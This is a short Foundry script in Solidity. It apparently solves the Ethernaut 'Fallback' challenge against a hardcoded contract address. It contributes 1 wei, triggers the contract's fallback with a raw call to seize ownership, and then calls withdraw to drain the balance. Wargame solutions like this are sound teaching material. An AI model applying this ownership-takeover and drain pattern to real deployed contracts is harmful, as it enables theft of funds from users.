// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

import {Fallback} from "../src/Fallback.sol";

contract FallbackSolution is Script {

    Fallback public fallbackInstance = Fallback(payable(0x8eaddAC31B8CdE2863DE4f7191fe6b10086DbAD9));

    function run() external {
        console.log("Original Owner: ", fallbackInstance.owner());

        vm.startBroadcast();

        fallbackInstance.contribute{value: 1 wei}();
        address(fallbackInstance).call{value: 1 wei}("");
        console.log("New Owner: ", fallbackInstance.owner());
        console.log("My Address: ", vm.envAddress("MY_ADDRESS"));
        fallbackInstance.withdraw();
        
        vm.stopBroadcast();
    }
}